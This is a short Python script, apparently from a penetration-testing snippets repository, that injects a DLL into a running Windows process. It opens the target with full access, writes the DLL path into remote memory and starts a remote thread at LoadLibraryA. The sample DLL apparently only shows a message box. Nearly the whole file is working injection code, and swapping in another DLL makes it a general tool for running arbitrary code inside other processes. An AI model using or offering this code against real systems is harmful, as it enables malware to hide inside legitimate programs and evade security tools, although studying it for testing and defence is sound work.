import os
import ctypes
import win32api
import win32process
import win32event
import win32con  # for win32 constants

PID = 15832
DLL_PATH = os.path.abspath('msgbox.dll')


def inject_dll(pid, dll_path):
    process_handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
    memory_address = win32process.VirtualAllocEx(process_handle,
                                                 0,
                                                 len(dll_path),
                                                 win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                                                 win32con.PAGE_READWRITE)

    k32 = ctypes.windll.kernel32

    bytes_written = ctypes.c_int(0)
    k32.WriteProcessMemory(int(process_handle), memory_address, dll_path, len(dll_path), ctypes.byref(bytes_written))

    k32_handle = win32api.GetModuleHandle('kernel32.dll')
    load_library_a_address = win32api.GetProcAddress(k32_handle, b"LoadLibraryA")
    remote_data = win32process.CreateRemoteThread(process_handle, None, 0, load_library_a_address, memory_address, 0)

    event_state = win32event.WaitForSingleObjectEx(remote_data[0], 60 * 1000, False)
    if event_state == win32event.WAIT_TIMEOUT:
        print('Injected DllMain thread timed out.')


def main():
    si = win32process.STARTUPINFO()
    # proc_data = win32process.CreateProcess(r'notepad.exe', None, None, None, False,
    #                                        win32process.CREATE_SUSPENDED, None, None, si)
    inject_dll(14920, r'D:\repo\penetration-testing-snippets\dll\msgbox.dll')

    # win32process.ResumeThread(proc_data[1])


if __name__ == "__main__":
    main()
